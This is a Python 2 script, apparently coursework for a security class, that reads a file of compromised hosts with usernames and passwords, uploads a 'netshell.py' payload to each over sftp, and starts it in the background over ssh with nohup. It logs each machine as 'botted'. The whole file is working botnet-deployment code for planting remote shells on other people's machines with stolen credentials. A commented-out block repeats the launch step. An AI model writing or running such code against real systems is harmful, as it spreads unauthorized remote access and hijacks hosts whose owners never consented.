#!/usr/bin/python2

import socket, select, subprocess, sys, os, time
from pexpect import *
ipList = []
userList = []
passwordList = []
botted_hosts = open('botted_hosts.txt', 'w')


#sftp variables
path = '/home/' 
localpath = '/home/aoshea/cs427/netHell.py'

netshell_file = open("netshell.py", "r")
comp_host_file = open("compromised_hosts.txt", "r")
comp_hosts = comp_host_file.read().rstrip().split("\n")
num_of_hosts = len(comp_hosts)
for i in range(0, num_of_hosts): 
	host = comp_hosts[i].split(" ")
	ipList.append(host[0])
	userList.append(host[1])
	passwordList.append(host[2])
	i += 1
print "Installing bot on the following hosts: \n" + str(ipList) 
#adds netshell to home dir. Only running first host to test
for i in range(0,num_of_hosts): 

	host = ipList[i]
	username = userList[i]
	password = passwordList[i]
	#creates sftp connection for upload
	p = spawn('sftp %s@%s' %(username, host))
	p.logfile_read
	#creates ssh connection for starting script
	p2 = spawn('ssh %s@%s' %(username, host))
	p2.logfile_read #= sys.stdout
	print "Executing: %s@%s" %(username, host) 
	try:
		p.expect('(?i)password: ')
		x = p.sendline(password)
		x = p.expect(['Permission denied', 'sftp>'])
		if x == 0: 
			print 'permision denied' 
			p.kill(0) 
		else: 
			x = p.sendline('put netshell.py' ) 
			x = p.expect('sftp>') 
			x = p.sendline('logout') 
			p.close()
			
			print "script uploaded"
		#starting netshell
		p2.expect('(?i)password: ')
		x2 = p2.sendline(password)
		if x2 == 0: 
			print 'permision denied' 
			p.kill(0) 
		else: 
			#sleep is called to let the return prompt display before
			#entering next command
			time.sleep(1)
			x2 = p2.sendline('nohup python netshell.py &') 
			x2 = p2.sendline() 
			x2 = p2.expect('~\$') 
			x2 = p2.sendline('logout') 
			botted_hosts.write(host + "\n")
			p2.close()
			print "shell started"
	except EOF: 
		print str(p)
		print "SFTP" 
	except TIMEOUT: 
		print str(p)
	i += 1
"""
#Start the netshell.py
for i in range(0,num_of_hosts): 

	host = ipList[i]
	username = userList[i]
	password = passwordList[i]

	p2 = spawn('ssh %s@%s' %(username, host))
	p2.logfile_read #= sys.stdout

	try:
		p2.expect('(?i)password: ')
		x2 = p.sendline(password)
		if x2 == 0: 
			print 'permision denied' 
			p.kill(0) 
		else: 
			#sleep is called to let the return prompt display before
			#entering next command
			time.sleep(1)
			x2 = p2.sendline('nohup python netshell.py &') 
			x2 = p2.sendline() 
			x2 = p2.expect('~\$') 
			x2 = p2.sendline('logout') 
			botted_hosts.write(host + "\n")
			p2.close()
			print "shell started on user: " + 'ssh %s@%s' %(username, host)
	except EOF: 
		print str(p)
		print "SSH" 
	except TIMEOUT: 
		print str(p)
	i += 1
"""
botted_hosts.close() 
